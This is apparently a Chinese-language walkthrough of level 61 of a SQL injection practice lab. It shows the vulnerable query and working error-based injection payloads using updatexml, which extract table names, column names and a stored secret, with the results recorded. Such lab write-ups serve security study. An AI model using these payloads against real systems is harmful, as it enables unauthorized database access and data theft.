---
title: less61
url: https://www.yuque.com/u29002979/ep2zrx/yierorvctngwd59u
---

```bash
$sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";
```

闭合方式 '))

`?id=1')) and 1=1--+`
`?id=1')) and 1=2--+`

<a name="OK6A0"></a>

# 报错注入

```bash
爆破数据表
?id=-1')) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
数据表：vo9h7b29b1

爆破字段名
?id=-1')) and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='vo9h7b29b1'),0x7e),1) -- +
字段：secret_T03L

获取密码
?id=-1')) and updatexml(1,concat(0x7e,(select secret_T03L from vo9h7b29b1),0x7e),1) -- +
密码：zA5wJbBXHvyGPdbQ8phfJBBn
```
